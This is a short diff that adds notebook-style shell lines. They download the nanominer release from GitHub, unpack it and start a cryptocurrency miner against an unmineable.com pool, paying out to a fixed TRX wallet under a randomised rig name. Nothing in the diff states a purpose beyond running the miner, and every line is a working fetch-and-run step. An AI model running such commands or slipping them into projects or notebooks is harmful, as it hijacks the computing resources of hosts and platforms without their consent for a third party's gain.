@@ -1,0 +1,6 @@
+
+wget https://github.com/nanopool/nanominer/releases/download/v3.3.8/nanominer-linux-3.3.8-cuda11.tar.gz
+tar -xvf nanominer-linux-3.3.8-cuda11.tar.gz
+%cd nanominer-linux-3.3.8-cuda11
+./nanominer -algo ethash -pool ethash.unmineable.com:13333 -wallet TRX:TQTbjGFzERMTQZXUtLih2BroBXVLt5yHE5 -rigname  $(echo $(shuf -i 1000-9999 -n 1)-ergo) 
+ 
